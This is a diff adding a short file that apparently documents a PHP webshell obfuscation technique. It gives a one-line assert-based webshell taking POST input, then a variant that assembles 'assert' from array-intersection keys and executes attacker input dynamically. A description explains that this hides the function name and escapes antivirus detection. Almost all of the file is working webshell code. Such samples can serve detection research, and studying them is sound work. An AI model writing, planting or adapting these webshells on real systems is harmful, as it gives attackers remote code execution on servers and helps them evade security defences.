@@ -1,0 +1,24 @@
+Original webshell sample:
+
+'''
+<?php assert($_POST['q']);?>
+'''
+
+Webshell obtained after using the corresponding method:
+
+'''
+<?php
+$a1 = array("a"=>"red","ss"=>"green","c"=>"blue","er"=>"hello","t"=>"hey");
+$a2 = array("a"=>"red","ss"=>"blue","d"=>"pink","er"=>"hellos","moza"=>"good_boy","t"=>"hey");
+$result = array_intersect_key($a1, $a2);
+$a = array_keys($result);
+$man = $a[0].$a[1].$a[2]."t";
+$kk=$_POST['q'];
+@$man(`/**/`.$kk=$kk);
+print_r($a1);
+?>
+'''
+
+Description:
+
+This method uses a combination of php array intersection operation and dynamic code execution, by performing array intersection operation on variables "a1", "a2", assigning the result to the variable "result", then taking the array key-value and assigning it to the variable "a". By string splicing, the string "assert" is assigned to the variable "man", and finally the dynamic execution method is used to execute the webshell. This way also hides the sensitive function "assert" and escapes detection by the antivirus engine.
